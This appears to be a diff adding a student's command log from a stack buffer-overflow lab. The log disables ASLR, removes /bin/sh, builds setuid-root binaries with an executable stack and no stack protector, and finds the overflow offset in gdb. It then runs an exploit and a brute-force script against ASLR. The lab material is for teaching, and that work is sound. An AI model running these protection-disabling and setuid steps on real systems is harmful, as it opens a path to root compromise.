@@ -1,0 +1,32 @@
+sudo sysctl -w kernel.randomize_va_space=0
+gcc call_shellcode.c -o call_shellcode -z execstack
+sudo rm /bin/sh
+sudo ln -s /bin/zsh /bin/sh
+sudo chown root call_shellcode
+sudo chmod 4755 call_shellcode
+ls -l call_shellcode
+gcc -o stack -z execstack -fno-stack-protector stack.c
+sudo chown root stack
+sudo chmod 4755 stack
+ls -l stack
+echo "Karnataka is a grate state with vivid cultures!" > badfile
+./stack
+gcc stack.c -o stack_gdb -g -z execstack -fno-stack-protector
+ls -l stack_gdb
+gdb stack_gdb
+b bof
+r
+p &buffer
+p $ebp
+p (0xbfffeb08-0xbfffeae8)
+quit
+gcc -o exploit exploit.c
+sudo rm badfile
+./exploit
+hexdump -C badfile
+ls -l stack
+./stack
+
+sudo /sbin/sysctl -w kernel.randomize_va_space=2
+sed -i -e 's/\r$//' infinite.sh
+./infinite.sh
